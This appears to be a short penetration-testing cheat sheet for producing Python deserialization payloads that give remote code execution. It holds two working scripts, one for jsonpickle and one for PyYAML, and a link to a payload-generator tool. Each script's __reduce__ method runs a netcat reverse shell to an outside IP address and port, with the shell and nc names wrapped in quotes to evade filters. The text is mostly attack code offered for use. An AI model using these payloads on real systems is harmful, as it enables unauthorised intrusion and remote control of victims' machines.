Here you can find some useful tools to generate malicious string to be used to gain RCE via deserializations.

# JSONPickle
This exactly the same as pickle but the jsonpickle library is used instead resulting in a small adjustments code need to be done
```
import jsonpickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | "
               "/bin/'s'h -i 2>&1 | n'c' 10.10.15.232 6666 > /tmp/f")
        return os.system, (cmd,)

if __name__ == '__main__':
# Serialize (generate payload)
    pickled = jsonpickle.encode(RCE())
    print("Payload: ")
    print(base64.b64encode(pickled))
	
# Deserialize (vulnerable code)
jsonpickle.decode(pickled)

```

# YAML(aka PyYaml)
Same here but we use yaml to write our code
```
import yaml
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | "
               "/bin/'s'h -i 2>&1 | n'c' 10.10.15.232 6666 > /tmp/f")
        return os.system, (cmd,)

if __name__ == '__main__':
# Serialize (generate payload)
    pickled = yaml.dump(RCE())
    print("Payload: ")
    print(base64.b64encode(pickled))
	
# Deserialize (vulnerable code)
yaml.load(pickled)
```


# PEAS (https://github.com/j0lt-github/python-deserialization-attack-payload-generator)
This is a all-in-one tool that let's you generate the strings based on the format you wish(pickle, jsonpickle, pyyaml etc)
